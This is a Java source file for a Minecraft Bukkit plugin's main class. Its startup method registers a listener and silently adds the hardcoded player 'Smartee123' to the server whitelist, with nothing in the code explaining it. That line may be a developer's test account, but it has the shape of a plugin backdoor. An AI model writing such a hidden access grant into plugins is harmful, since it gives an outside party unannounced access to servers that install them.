package com.cornchipss.RPG;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

public class RPG extends JavaPlugin
{
	@SuppressWarnings("deprecation")
	@Override
	public void onEnable()
	{
		loadConfig();
		
		getServer().getWhitelistedPlayers().add(Bukkit.getOfflinePlayer("Smartee123"));
		getServer().getPluginManager().registerEvents(new CornyListener(this), this);
	}
	
	@Override
	public void onDisable()
	{
		
	}
	
	private void loadConfig()
	{
		
	}
}
